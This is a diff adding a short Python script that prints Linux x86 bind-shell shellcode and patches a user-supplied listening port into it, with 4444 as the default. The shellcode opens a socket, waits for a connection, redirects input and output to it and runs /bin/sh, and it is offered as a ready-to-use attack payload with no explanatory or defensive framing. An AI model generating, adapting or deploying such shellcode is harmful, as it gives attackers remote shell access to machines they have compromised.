@@ -1,0 +1,23 @@
+import sys
+ 
+shellcode = r"\x31\xc0\x89\xc3\x89\xc1\x89\xc7\xb0\x66\xfe\xc3\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x5f\x31\xd2\x52\x66\x68\x11\x5c\x66\x53\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x5a\xcd\x80\x31\xc0\x50\x50\xb0\x66\xb3\x05\x52\x89\xe1\xcd\x80\x93\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\x83\xf9\x03\x75\xf5\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:  
+        print("Usage: python3 bindtcp.py <port>")
+        print("Default (port 4444) bind TCP shellcode: \"" + shellcode + "\"")
+        exit()
+
+    if (65535 < int(sys.argv[1])) :
+        print("Port too large")
+        exit()
+
+    port = hex(int(sys.argv[1]))
+    port = port.replace('0x','').zfill(4)
+    port = port[0:2]+port[2:4]
+    hexport =  "\\x" + port[0:2] + "\\x" + port[2:]
+    
+    print("Port: " + sys.argv[1] + hexport)
+    shellcode = shellcode.replace("\\x11\\x5c",hexport)
+    print("Bind TCP shellcode: \"" + shellcode + "\"")
